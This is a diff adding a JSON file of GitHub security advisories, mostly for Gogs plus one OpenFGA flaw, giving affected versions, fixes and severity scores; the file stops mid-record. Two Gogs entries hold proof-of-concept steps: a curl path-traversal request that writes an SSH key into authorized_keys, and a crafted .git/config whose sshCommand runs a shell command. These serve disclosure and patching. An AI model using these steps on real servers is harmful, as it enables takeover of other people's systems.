@@ -1,0 +1,781 @@
+[
+  {
+    "ghsa_id": "GHSA-32q6-rr98-cjqv",
+    "cve_id": "CVE-2024-56323",
+    "url": "https://api.github.com/advisories/GHSA-32q6-rr98-cjqv",
+    "html_url": "https://github.com/advisories/GHSA-32q6-rr98-cjqv",
+    "summary": "OpenFGA Authorization Bypass",
+    "description": "### Overview\nOpenFGA v1.3.8 to v1.8.2 (Helm chart openfga-0.1.38 to openfga-0.2.19, docker v1.3.8 to v.1.8.2) are vulnerable to authorization bypass when certain Check and ListObject calls are executed.\n\n### Am I Affected?\nYou are affected by this authorization bypass vulnerability if you are using OpenFGA v1.3.8 to v1.8.2, specifically under the following conditions: \n1. Calling Check API or ListObjects with a model that uses [conditions](https://openfga.dev/docs/modeling/conditions), and \n2. OpenFGA is configured with caching enabled (`OPENFGA_CHECK_QUERY_CACHE_ENABLED`), and \n3. Check API call or ListObjects API calls contain [contextual tuples](https://openfga.dev/docs/concepts#what-are-contextual-tuples) that include conditions.\n\n### Fix\nUpgrade to v1.8.3. This upgrade is backwards compatible.",
+    "type": "reviewed",
+    "severity": "medium",
+    "repository_advisory_url": "https://api.github.com/repos/openfga/openfga/security-advisories/GHSA-32q6-rr98-cjqv",
+    "source_code_location": "https://github.com/openfga/openfga",
+    "identifiers": [
+      {
+        "value": "GHSA-32q6-rr98-cjqv",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2024-56323",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/openfga/openfga/security/advisories/GHSA-32q6-rr98-cjqv",
+      "https://nvd.nist.gov/vuln/detail/CVE-2024-56323",
+      "https://pkg.go.dev/vuln/GO-2025-3384",
+      "https://github.com/advisories/GHSA-32q6-rr98-cjqv"
+    ],
+    "published_at": "2025-01-13T19:59:24Z",
+    "updated_at": "2025-01-14T21:08:16Z",
+    "github_reviewed_at": "2025-01-13T19:59:24Z",
+    "nvd_published_at": "2025-01-13T22:15:14Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/openfga/openfga"
+        },
+        "vulnerable_version_range": ">= 1.3.8, < 1.8.3",
+        "first_patched_version": "1.8.3",
+        "vulnerable_functions": []
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": null,
+        "score": 0
+      },
+      "cvss_v4": {
+        "vector_string": "CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:N/VI:N/VA:N/SC:H/SI:H/SA:H",
+        "score": 5.8
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-285",
+        "name": "Improper Authorization"
+      }
+    ],
+    "credits": [],
+    "cvss": {
+      "vector_string": null,
+      "score": null
+    }
+  },
+  {
+    "ghsa_id": "GHSA-vm62-9jw3-c8w3",
+    "cve_id": "CVE-2024-39930",
+    "url": "https://api.github.com/advisories/GHSA-vm62-9jw3-c8w3",
+    "html_url": "https://github.com/advisories/GHSA-vm62-9jw3-c8w3",
+    "summary": "Gogs has an argument Injection in the built-in SSH server",
+    "description": "### Impact\n\nWhen the built-in SSH server is enabled (`[server] START_SSH_SERVER = true`), unprivileged user accounts with at least one SSH key can execute arbitrary commands on the Gogs instance with the privileges of the user specified by `RUN_USER` in the configuration. It allows attackers to access and alter any users' code hosted on the same instance.\n\n### Patches\n\nThe `env` command sent to the internal SSH server has been changed to be a passthrough (https://github.com/gogs/gogs/pull/7868), i.e. the feature is effectively removed. Users should upgrade to 0.13.1 or the latest 0.14.0+dev.\n\n### Workarounds\n\n[Disable the use of built-in SSH server](https://github.com/gogs/gogs/blob/7adac94f1e93cc5c3545ea31688662dcef9cd737/conf/app.ini#L76-L77) on operating systems other than Windows.\n\n### References\n\nhttps://www.cve.org/CVERecord?id=CVE-2024-39930\n",
+    "type": "reviewed",
+    "severity": "critical",
+    "repository_advisory_url": "https://api.github.com/repos/gogs/gogs/security-advisories/GHSA-vm62-9jw3-c8w3",
+    "source_code_location": "https://github.com/gogs/gogs",
+    "identifiers": [
+      {
+        "value": "GHSA-vm62-9jw3-c8w3",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2024-39930",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/gogs/gogs/security/advisories/GHSA-vm62-9jw3-c8w3",
+      "https://www.sonarsource.com/blog/securing-developer-tools-unpatched-code-vulnerabilities-in-gogs-1",
+      "https://www.vicarius.io/vsociety/posts/argument-injection-in-gogs-ssh-server-cve-2024-39930",
+      "https://github.com/advisories/GHSA-vm62-9jw3-c8w3"
+    ],
+    "published_at": "2024-12-23T20:38:34Z",
+    "updated_at": "2024-12-23T20:38:35Z",
+    "github_reviewed_at": "2024-12-23T20:38:34Z",
+    "nvd_published_at": null,
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "gogs.io/gogs"
+        },
+        "vulnerable_version_range": "<= 0.13.0",
+        "first_patched_version": "0.13.1",
+        "vulnerable_functions": []
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AC:L/AV:N/A:H/C:H/I:H/PR:L/S:C/UI:N",
+        "score": 10
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-88",
+        "name": "Improper Neutralization of Argument Delimiters in a Command ('Argument Injection')"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "swapgs",
+          "id": 37152314,
+          "node_id": "MDQ6VXNlcjM3MTUyMzE0",
+          "avatar_url": "https://avatars.githubusercontent.com/u/37152314?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/swapgs",
+          "html_url": "https://github.com/swapgs",
+          "followers_url": "https://api.github.com/users/swapgs/followers",
+          "following_url": "https://api.github.com/users/swapgs/following{/other_user}",
+          "gists_url": "https://api.github.com/users/swapgs/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/swapgs/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/swapgs/subscriptions",
+          "organizations_url": "https://api.github.com/users/swapgs/orgs",
+          "repos_url": "https://api.github.com/users/swapgs/repos",
+          "events_url": "https://api.github.com/users/swapgs/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/swapgs/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      }
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AC:L/AV:N/A:H/C:H/I:H/PR:L/S:C/UI:N",
+      "score": 10
+    },
+    "epss": {
+      "percentage": 0.00045,
+      "percentile": 0.17541
+    }
+  },
+  {
+    "ghsa_id": "GHSA-9pp6-wq8c-3w2c",
+    "cve_id": "CVE-2024-39932",
+    "url": "https://api.github.com/advisories/GHSA-9pp6-wq8c-3w2c",
+    "html_url": "https://github.com/advisories/GHSA-9pp6-wq8c-3w2c",
+    "summary": "Gogs allows argument injection during the previewing of changes",
+    "description": "### Impact\n\nUnprivileged user accounts can write to arbitrary files on the filesystem. We could demonstrate its exploitation to force a re-installation of the instance, granting administrator rights. It allows accessing and altering any user's code hosted on the same instance.\n\n### Patches\n\nUnintended Git options has been ignored for diff preview (https://github.com/gogs/gogs/pull/7871). Users should upgrade to 0.13.1 or the latest 0.14.0+dev.\n\n### Workarounds\n\nNo viable workaround available, please only grant access to trusted users to your Gogs instance on affected versions.\n\n### References\n\nhttps://www.cve.org/CVERecord?id=CVE-2024-39932\n",
+    "type": "reviewed",
+    "severity": "critical",
+    "repository_advisory_url": "https://api.github.com/repos/gogs/gogs/security-advisories/GHSA-9pp6-wq8c-3w2c",
+    "source_code_location": "https://github.com/gogs/gogs",
+    "identifiers": [
+      {
+        "value": "GHSA-9pp6-wq8c-3w2c",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2024-39932",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/gogs/gogs/security/advisories/GHSA-9pp6-wq8c-3w2c",
+      "https://nvd.nist.gov/vuln/detail/CVE-2024-39932",
+      "https://www.sonarsource.com/blog/securing-developer-tools-unpatched-code-vulnerabilities-in-gogs-1",
+      "https://github.com/advisories/GHSA-9pp6-wq8c-3w2c"
+    ],
+    "published_at": "2024-12-23T20:38:27Z",
+    "updated_at": "2024-12-23T20:38:28Z",
+    "github_reviewed_at": "2024-12-23T20:38:27Z",
+    "nvd_published_at": null,
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "gogs.io/gogs"
+        },
+        "vulnerable_version_range": "<= 0.13.0",
+        "first_patched_version": "0.13.1",
+        "vulnerable_functions": []
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AC:L/AV:N/A:H/C:H/I:H/PR:L/S:C/UI:N",
+        "score": 10
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-94",
+        "name": "Improper Control of Generation of Code ('Code Injection')"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "swapgs",
+          "id": 37152314,
+          "node_id": "MDQ6VXNlcjM3MTUyMzE0",
+          "avatar_url": "https://avatars.githubusercontent.com/u/37152314?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/swapgs",
+          "html_url": "https://github.com/swapgs",
+          "followers_url": "https://api.github.com/users/swapgs/followers",
+          "following_url": "https://api.github.com/users/swapgs/following{/other_user}",
+          "gists_url": "https://api.github.com/users/swapgs/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/swapgs/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/swapgs/subscriptions",
+          "organizations_url": "https://api.github.com/users/swapgs/orgs",
+          "repos_url": "https://api.github.com/users/swapgs/repos",
+          "events_url": "https://api.github.com/users/swapgs/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/swapgs/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      }
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AC:L/AV:N/A:H/C:H/I:H/PR:L/S:C/UI:N",
+      "score": 10
+    },
+    "epss": {
+      "percentage": 0.00043,
+      "percentile": 0.10511
+    }
+  },
+  {
+    "ghsa_id": "GHSA-ccqv-43vm-4f3w",
+    "cve_id": "CVE-2024-39931",
+    "url": "https://api.github.com/advisories/GHSA-ccqv-43vm-4f3w",
+    "html_url": "https://github.com/advisories/GHSA-ccqv-43vm-4f3w",
+    "summary": "Gogs allows deletion of internal files",
+    "description": "### Impact\n\nUnprivileged user accounts can execute arbitrary commands on the Gogs instance with the privileges of the account specified by `RUN_USER` in the configuration. It allows attackers to access and alter any users' code hosted on the same instance.\n\n### Patches\n\nDeletion of `.git` files has been prohibited (https://github.com/gogs/gogs/pull/7870). Users should upgrade to 0.13.1 or the latest 0.14.0+dev.\n\n### Workarounds\n\nNo viable workaround available, please only grant access to trusted users to your Gogs instance on affected versions.\n\n### References\n\nhttps://www.cve.org/CVERecord?id=CVE-2024-39931\n",
+    "type": "reviewed",
+    "severity": "critical",
+    "repository_advisory_url": "https://api.github.com/repos/gogs/gogs/security-advisories/GHSA-ccqv-43vm-4f3w",
+    "source_code_location": "https://github.com/gogs/gogs",
+    "identifiers": [
+      {
+        "value": "GHSA-ccqv-43vm-4f3w",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2024-39931",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/gogs/gogs/security/advisories/GHSA-ccqv-43vm-4f3w",
+      "https://nvd.nist.gov/vuln/detail/CVE-2024-39931",
+      "https://www.sonarsource.com/blog/securing-developer-tools-unpatched-code-vulnerabilities-in-gogs-1",
+      "https://github.com/advisories/GHSA-ccqv-43vm-4f3w"
+    ],
+    "published_at": "2024-12-23T20:38:20Z",
+    "updated_at": "2024-12-23T20:38:21Z",
+    "github_reviewed_at": "2024-12-23T20:38:20Z",
+    "nvd_published_at": null,
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "gogs.io/gogs"
+        },
+        "vulnerable_version_range": "<= 0.13.0",
+        "first_patched_version": "0.13.1",
+        "vulnerable_functions": []
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AC:L/AV:N/A:H/C:H/I:H/PR:L/S:C/UI:N",
+        "score": 10
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-552",
+        "name": "Files or Directories Accessible to External Parties"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "swapgs",
+          "id": 37152314,
+          "node_id": "MDQ6VXNlcjM3MTUyMzE0",
+          "avatar_url": "https://avatars.githubusercontent.com/u/37152314?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/swapgs",
+          "html_url": "https://github.com/swapgs",
+          "followers_url": "https://api.github.com/users/swapgs/followers",
+          "following_url": "https://api.github.com/users/swapgs/following{/other_user}",
+          "gists_url": "https://api.github.com/users/swapgs/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/swapgs/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/swapgs/subscriptions",
+          "organizations_url": "https://api.github.com/users/swapgs/orgs",
+          "repos_url": "https://api.github.com/users/swapgs/repos",
+          "events_url": "https://api.github.com/users/swapgs/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/swapgs/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      }
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AC:L/AV:N/A:H/C:H/I:H/PR:L/S:C/UI:N",
+      "score": 10
+    },
+    "epss": {
+      "percentage": 0.00043,
+      "percentile": 0.10511
+    }
+  },
+  {
+    "ghsa_id": "GHSA-m27m-h5gj-wwmg",
+    "cve_id": "CVE-2024-39933",
+    "url": "https://api.github.com/advisories/GHSA-m27m-h5gj-wwmg",
+    "html_url": "https://github.com/advisories/GHSA-m27m-h5gj-wwmg",
+    "summary": "Gogs allows argument Injection when tagging new releases",
+    "description": "### Impact\n\nUnprivileged user accounts with at least one SSH key can read arbitrary files on the system. For instance, they could leak the configuration files that could contain database credentials (`[database] *`) and `[security] SECRET_KEY`. Attackers could also exfiltrate TLS certificates, other users' repositories, and the Gogs database when the SQLite driver is enabled.\n\n### Patches\n\nUnintended Git options has been ignored for creating tags (https://github.com/gogs/gogs/pull/7872). Users should upgrade to 0.13.1 or the latest 0.14.0+dev.\n\n### Workarounds\n\nNo viable workaround available, please only grant access to trusted users to your Gogs instance on affected versions.\n\n### References\n\nhttps://www.cve.org/CVERecord?id=CVE-2024-39933\n",
+    "type": "reviewed",
+    "severity": "high",
+    "repository_advisory_url": "https://api.github.com/repos/gogs/gogs/security-advisories/GHSA-m27m-h5gj-wwmg",
+    "source_code_location": "https://github.com/gogs/gogs",
+    "identifiers": [
+      {
+        "value": "GHSA-m27m-h5gj-wwmg",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2024-39933",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/gogs/gogs/security/advisories/GHSA-m27m-h5gj-wwmg",
+      "https://nvd.nist.gov/vuln/detail/CVE-2024-39933",
+      "https://github.com/gogs/gogs/pull/7872",
+      "https://github.com/gogs/gogs/commit/76831d0d06c44c5cf46dc22b380440b7507c2f07",
+      "https://www.sonarsource.com/blog/securing-developer-tools-unpatched-code-vulnerabilities-in-gogs-1",
+      "https://github.com/advisories/GHSA-m27m-h5gj-wwmg"
+    ],
+    "published_at": "2024-12-23T20:38:12Z",
+    "updated_at": "2024-12-23T20:38:13Z",
+    "github_reviewed_at": "2024-12-23T20:38:12Z",
+    "nvd_published_at": null,
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "gogs.io/gogs"
+        },
+        "vulnerable_version_range": "<= 0.13.0",
+        "first_patched_version": "0.13.1",
+        "vulnerable_functions": []
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AC:L/AV:N/A:N/C:H/I:N/PR:L/S:C/UI:N",
+        "score": 7.7
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-88",
+        "name": "Improper Neutralization of Argument Delimiters in a Command ('Argument Injection')"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "swapgs",
+          "id": 37152314,
+          "node_id": "MDQ6VXNlcjM3MTUyMzE0",
+          "avatar_url": "https://avatars.githubusercontent.com/u/37152314?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/swapgs",
+          "html_url": "https://github.com/swapgs",
+          "followers_url": "https://api.github.com/users/swapgs/followers",
+          "following_url": "https://api.github.com/users/swapgs/following{/other_user}",
+          "gists_url": "https://api.github.com/users/swapgs/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/swapgs/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/swapgs/subscriptions",
+          "organizations_url": "https://api.github.com/users/swapgs/orgs",
+          "repos_url": "https://api.github.com/users/swapgs/repos",
+          "events_url": "https://api.github.com/users/swapgs/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/swapgs/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      }
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AC:L/AV:N/A:N/C:H/I:N/PR:L/S:C/UI:N",
+      "score": 7.7
+    },
+    "epss": {
+      "percentage": 0.00043,
+      "percentile": 0.10511
+    }
+  },
+  {
+    "ghsa_id": "GHSA-qf5v-rp47-55gg",
+    "cve_id": "CVE-2024-55947",
+    "url": "https://api.github.com/advisories/GHSA-qf5v-rp47-55gg",
+    "html_url": "https://github.com/advisories/GHSA-qf5v-rp47-55gg",
+    "summary": "Path Traversal in file update API in gogs",
+    "description": "### Impact\n\nThe malicious user is able to write a file to an arbitrary path on the server to gain SSH access to the server. \n\n### Patches\n\nWriting files outside repository Git directory has been prohibited via the repository file update API (https://github.com/gogs/gogs/pull/7859). Users should upgrade to 0.13.1 or the latest 0.14.0+dev.\n\n### Workarounds\n\nNo viable workaround available, please only grant access to trusted users to your Gogs instance on affected versions.\n\n### References\n\nn/a\n\n### Proof of Concept\n\n1. Generate a Personal Access Tokens\n2. Edit any file on the server with this\n\n    ```bash\n    curl -v --path-as-is -X PUT --url \"http://localhost:10880/api/v1/repos/Test/bbcc/contents/../../../../../../../../home/git/.ssh/authorized_keys\" \\\n    -H \"Authorization: token eaac23cf58fc76bbaecd686ec52cd44d903db9bf\" \\\n    -H \"Content-Type: application/json\" \\\n    --data '{\n      \"message\": \"an\",\n      \"content\": \"<base64encoded: your ssh pub key>\"\n    }'\n    ```\n\n3. ssh connect to remote server\n\n    ```bash\n    ssh -i temp git@localhost -p 10022\n    ```\n\n### For more information\nIf you have any questions or comments about this advisory, please post on https://github.com/gogs/gogs/issues/7582.\n",
+    "type": "reviewed",
+    "severity": "high",
+    "repository_advisory_url": "https://api.github.com/repos/gogs/gogs/security-advisories/GHSA-qf5v-rp47-55gg",
+    "source_code_location": "https://github.com/gogs/gogs",
+    "identifiers": [
+      {
+        "value": "GHSA-qf5v-rp47-55gg",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2024-55947",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/gogs/gogs/security/advisories/GHSA-qf5v-rp47-55gg",
+      "https://nvd.nist.gov/vuln/detail/CVE-2024-55947",
+      "https://github.com/gogs/gogs/issues/7582",
+      "https://github.com/gogs/gogs/pull/7859",
+      "https://github.com/gogs/gogs/commit/9a9388ace25bd646f5098cb9193d983332c34e41",
+      "https://github.com/advisories/GHSA-qf5v-rp47-55gg"
+    ],
+    "published_at": "2024-12-23T17:53:16Z",
+    "updated_at": "2024-12-23T20:54:48Z",
+    "github_reviewed_at": "2024-12-23T17:53:16Z",
+    "nvd_published_at": "2024-12-23T16:15:07Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "gogs.io/gogs"
+        },
+        "vulnerable_version_range": "< 0.13.1",
+        "first_patched_version": "0.13.1",
+        "vulnerable_functions": []
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": null,
+        "score": 0
+      },
+      "cvss_v4": {
+        "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
+        "score": 8.7
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-22",
+        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "ManassehZhou",
+          "id": 2705803,
+          "node_id": "MDQ6VXNlcjI3MDU4MDM=",
+          "avatar_url": "https://avatars.githubusercontent.com/u/2705803?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/ManassehZhou",
+          "html_url": "https://github.com/ManassehZhou",
+          "followers_url": "https://api.github.com/users/ManassehZhou/followers",
+          "following_url": "https://api.github.com/users/ManassehZhou/following{/other_user}",
+          "gists_url": "https://api.github.com/users/ManassehZhou/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/ManassehZhou/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/ManassehZhou/subscriptions",
+          "organizations_url": "https://api.github.com/users/ManassehZhou/orgs",
+          "repos_url": "https://api.github.com/users/ManassehZhou/repos",
+          "events_url": "https://api.github.com/users/ManassehZhou/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/ManassehZhou/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      }
+    ],
+    "cvss": {
+      "vector_string": null,
+      "score": null
+    },
+    "epss": {
+      "percentage": 0.00045,
+      "percentile": 0.17541
+    }
+  },
+  {
+    "ghsa_id": "GHSA-r7j8-5h9c-f6fx",
+    "cve_id": "CVE-2024-54148",
+    "url": "https://api.github.com/advisories/GHSA-r7j8-5h9c-f6fx",
+    "html_url": "https://github.com/advisories/GHSA-r7j8-5h9c-f6fx",
+    "summary": "Remote Command Execution in file editing in gogs",
+    "description": "### Impact\n\nThe malicious user is able to commit and edit a crafted symlink file to a repository to gain SSH access to the server. \n\n### Patches\n\nEditing symlink while changing the file name has been prohibited via the repository web editor (https://github.com/gogs/gogs/pull/7857). Users should upgrade to 0.13.1 or the latest 0.14.0+dev.\n\n### Workarounds\n\nNo viable workaround available, please only grant access to trusted users to your Gogs instance on affected versions.\n\n### References\n\nn/a\n\n### Proof of Concept\n\n1. Create two repositories, upload something to the first repository, edit any file, and save it on the webpage.\n2. In the second repository, create a symbolic link to the file you need to edit:\n    ```bash\n    $ ln -s /data/gogs/data/tmp/local-repo/1/.git/config test\n    $ ls -la\n    total 8\n    drwxr-xr-x   5 dd  staff  160 Oct 27 19:09 .\n    drwxr-xr-x   4 dd  staff  128 Oct 27 19:06 ..\n    drwxr-xr-x  12 dd  staff  384 Oct 27 19:09 .git\n    -rw-r--r--   1 dd  staff   12 Oct 27 19:06 README.md\n    lrwxr-xr-x   1 dd  staff   44 Oct 27 19:09 test -> /data/gogs/data/tmp/local-repo/1/.git/config\n    $ git add .\n    $ git commit -m 'ddd'\n    $ git push -f\n    ```\n\n3. Go back to the webpage, edit the symbolic file in the second repository, with the following content, change the filename, and save (here you can notice, with filename changed the symbolic file edit limit is bypassed)\n    ```\n    [core]\n    repositoryformatversion = 0\n    filemode = true\n    bare = false\n    logallrefupdates = true\n    ignorecase = true\n    precomposeunicode = true\n    sshCommand = echo pwnned > /tmp/poc\n    [remote \"origin\"]\n    url = [git@github.com](mailto:git@github.com):torvalds/linux.git\n    fetch = +refs/heads/*:refs/remotes/origin/*\n    [branch \"master\"]\n    remote = origin\n    merge = refs/heads/master\n    ```\n\n4. Go back to the first repo, edit something, and commit again, you can notice a file called `/tmp/poc` created on the server.\n\n### For more information\nIf you have any questions or comments about this advisory, please post on https://github.com/gogs/gogs/issues/7582.\n",
+    "type": "reviewed",
+    "severity": "high",
+    "repository_advisory_url": "https://api.github.com/repos/gogs/gogs/security-advisories/GHSA-r7j8-5h9c-f6fx",
+    "source_code_location": "https://github.com/gogs/gogs",
+    "identifiers": [
+      {
+        "value": "GHSA-r7j8-5h9c-f6fx",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2024-54148",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/gogs/gogs/security/advisories/GHSA-r7j8-5h9c-f6fx",
+      "https://nvd.nist.gov/vuln/detail/CVE-2024-54148",
+      "https://github.com/gogs/gogs/issues/7582",
+      "https://github.com/gogs/gogs/pull/7857",
+      "https://github.com/gogs/gogs/commit/c94baec9ca923f38c19f0c7c5af722b9ec04022a",
+      "https://github.com/advisories/GHSA-r7j8-5h9c-f6fx"
+    ],
+    "published_at": "2024-12-23T17:53:01Z",
+    "updated_at": "2024-12-26T20:09:16Z",
+    "github_reviewed_at": "2024-12-23T17:53:01Z",
+    "nvd_published_at": "2024-12-23T16:15:07Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "gogs.io/gogs"
+        },
+        "vulnerable_version_range": "< 0.13.1",
+        "first_patched_version": "0.13.1",
+        "vulnerable_functions": []
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+        "score": 9.8
+      },
+      "cvss_v4": {
+        "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
+        "score": 8.7
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-22",
+        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "ManassehZhou",
+          "id": 2705803,
+          "node_id": "MDQ6VXNlcjI3MDU4MDM=",
+          "avatar_url": "https://avatars.githubusercontent.com/u/2705803?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/ManassehZhou",
+          "html_url": "https://github.com/ManassehZhou",
+          "followers_url": "https://api.github.com/users/ManassehZhou/followers",
+          "following_url": "https://api.github.com/users/ManassehZhou/following{/other_user}",
+          "gists_url": "https://api.github.com/users/ManassehZhou/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/ManassehZhou/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/ManassehZhou/subscriptions",
+          "organizations_url": "https://api.github.com/users/ManassehZhou/orgs",
+          "repos_url": "https://api.github.com/users/ManassehZhou/repos",
+          "events_url": "https://api.github.com/users/ManassehZhou/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/ManassehZhou/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      }
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+      "score": 9.8
+    },
+    "epss": {
+      "percentage": 0.00045,
+      "percentile": 0.17541
+    }
+  },
+  {
+    "ghsa_id": "GHSA-phm4-wf3h-pc3r",
+    "cve_id": "CVE-2024-44625",
+    "url": "https://api.github.com/advisories/GHSA-phm4-wf3h-pc3r",
+    "html_url": "https://github.com/advisories/GHSA-phm4-wf3h-pc3r",
+    "summary": "Unpatched Remote Code Execution in Gogs",
+    "description": "Gogs <=0.13.0 is vulnerable to Directory Traversal via the editFilePost function of internal/route/repo/editor.go.",
+    "type": "reviewed",
+    "severity": "high",
+    "repository_advisory_url": null,
+    "source_code_location": "https://github.com/gogs/gogs",
+    "identifiers": [
+      {
+        "value": "GHSA-phm4-wf3h-pc3r",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2024-44625",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2024-44625",
+      "https://fysac.github.io/posts/2024/11/unpatched-remote-code-execution-in-gogs",
+      "https://pkg.go.dev/vuln/GO-2024-3275",
+      "https://gogs.io",
+      "https://github.com/advisories/GHSA-phm4-wf3h-pc3r"
+    ],
+    "published_at": "2024-11-15T18:30:51Z",
+    "updated_at": "2024-11-20T16:44:13Z",
+    "github_reviewed_at": "2024-11-15T21:09:25Z",
+    "nvd_published_at": "2024-11-15T17:15:20Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "gogs.io/gogs"
+        },
+        "vulnerable_version_range": "<= 0.13.0",
+        "first_patched_version": null,
+        "vulnerable_functions": []
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+        "score": 8.8
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-22",
+        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+      }
+    ],
+    "credits": [],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
